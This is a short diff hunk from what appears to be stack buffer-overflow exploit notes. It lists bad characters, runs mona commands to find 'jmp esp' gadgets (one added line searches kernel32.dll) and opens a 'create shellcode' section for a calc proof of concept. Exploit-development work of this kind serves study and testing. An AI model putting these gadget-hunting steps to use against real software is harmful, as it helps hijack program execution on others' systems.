@@ -36,6 +36,7 @@ sprintf = "\x00\x0A\x0D"
 # find gadget
 !mona jmp -r esp -cpb "\x00\x0A"  --> 080416BF, 080414C3  (little endian)
 !mona jmp -r esp 
+!mona findwild -m kernel32.dll -s "jmp esp" -cpb "\x00\x0a\x0d"
 
 # create shellcode
 # CALC
